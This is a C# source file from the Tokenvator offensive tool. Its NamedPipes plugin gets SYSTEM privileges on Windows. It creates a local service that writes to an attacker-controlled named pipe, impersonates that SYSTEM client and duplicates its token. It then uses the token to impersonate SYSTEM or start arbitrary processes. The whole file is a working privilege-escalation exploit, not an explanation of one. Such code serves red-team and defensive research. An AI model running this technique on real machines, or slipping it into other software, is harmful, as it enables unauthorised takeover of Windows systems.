using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;

using Tokenvator.Resources;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator.Plugins.NamedPipes
{
    class NamedPipes
    {
        private static IntPtr hToken = IntPtr.Zero;
        private const string BASE_DIRECTORY = @"\\.\pipe\";
        private static readonly AutoResetEvent waitHandle = new AutoResetEvent(false);

        private delegate bool Create(IntPtr phNewToken, string newProcess, string arguments);

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal NamedPipes()
        {
            
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// GetSystem function for when SeDebugPrivilege is not available
        ////////////////////////////////////////////////////////////////////////////////
        internal static void GetSystem()
        {
            if (!_GetSystem())
                return;

            if (IntPtr.Zero != hToken)
            {
                advapi32.ImpersonateLoggedOnUser(hToken);
                kernel32.CloseHandle(hToken);
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                hToken = IntPtr.Zero;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// GetSystem function for when SeDebugPrivilege is not available
        ////////////////////////////////////////////////////////////////////////////////
        internal static void GetSystem(string command, string arguments)
        {
            if (!_GetSystem())
                return;

            Create createProcess;
            if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
                createProcess = CreateProcess.CreateProcessWithLogonW;
            else
                createProcess = CreateProcess.CreateProcessWithTokenW;
            createProcess(hToken, command, arguments);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// Internal GetSystem function where the magic happens
        ////////////////////////////////////////////////////////////////////////////////
        private static bool _GetSystem()
        {
            string pipename = PSExec.GenerateUuid(12);

            Thread thread = new Thread(() => _GetPipeToken(BASE_DIRECTORY + pipename));

            using (PSExec psExec = new PSExec("Tokenvator"))
            {
                if (!psExec.Connect("."))
                {
                    Console.WriteLine("[-] Unable to connect to local service host");
                    return false;
                }
                if (!psExec.Create("%COMSPEC% /c echo tokenvator > " + BASE_DIRECTORY + pipename))
                    return false;
                if (!psExec.Open())
                    return false;
                thread.Start();
                waitHandle.WaitOne();
                if (!psExec.Start())
                    return false;
                if (!psExec.Stop())
                    return false;
            }

            thread.Join();
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetPipeToken(string pipeName)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            if (IntPtr.Zero != hToken)
            {
                if (!advapi32.ImpersonateLoggedOnUser(hToken))
                {
                    Console.WriteLine("[-] Token Impersonation Failed");
                    Misc.GetWin32Error("ImpersonateLoggedOnUser");
                }

                kernel32.CloseHandle(hToken);
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                hToken = IntPtr.Zero;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetPipeToken(string pipeName, string command, string arguments)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            if (IntPtr.Zero != hToken)
            {
                Create createProcess;
                if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
                    createProcess = CreateProcess.CreateProcessWithLogonW;
                else
                    createProcess = CreateProcess.CreateProcessWithTokenW;
                createProcess(hToken, command, arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static bool _GetPipeToken(string pipeName)
        {
            try
            {
                PipeSecurity pipeSecurity = new PipeSecurity();
                pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow));
                using (NamedPipeServerStream namedPipe = new NamedPipeServerStream(
                    pipeName, 
                    PipeDirection.InOut, 2, 
                    PipeTransmissionMode.Message, 
                    PipeOptions.None, 
                    128, 128, pipeSecurity
                ))
                {
                    Console.WriteLine("[+] Created Pipe {0}", BASE_DIRECTORY + pipeName);
                    namedPipe.WaitForConnection();
                    Console.WriteLine("[+] Connected to Pipe {0}", pipeName);
                    using (var streamReader = new StreamReader(namedPipe))
                    {
                        streamReader.ReadToEnd();
                        if (!advapi32.ImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle()))
                        {
                            Misc.GetWin32Error("ImpersonateNamedPipeClient");
                            return false;
                        }
                        Console.WriteLine("[+] Impersonated Pipe {0}", pipeName);
                    }
                }
                
                
                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), Winnt.TOKEN_ALL_ACCESS, false, ref hToken))
                {
                    Misc.GetWin32Error("OpenThreadToken");
                    return false;
                }
                Console.WriteLine("[+] Thread Token 0x{0}", hToken.ToString("X4"));

                
                IntPtr phNewToken = new IntPtr();
                uint result = ntdll.NtDuplicateToken(hToken, Winnt.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenPrimary, ref phNewToken);
                if (IntPtr.Zero == phNewToken)
                {
                    result = ntdll.NtDuplicateToken(hToken, Winnt.TOKEN_ALL_ACCESS, IntPtr.Zero, true, Winnt._TOKEN_TYPE.TokenImpersonation, ref phNewToken);
                    if (IntPtr.Zero == phNewToken)
                    {
                        Misc.GetNtError("NtDuplicateToken", result);
                        return false;
                    }
                }


                if (IntPtr.Zero != phNewToken)
                {
                    hToken = phNewToken;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                waitHandle.Set();   
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal static void EnumeratePipes()
        {
            string[] pipes = Directory.GetFiles(BASE_DIRECTORY);
            foreach (string pipe in pipes)
            {
                Console.WriteLine(pipe);
            }
        }
    }
}
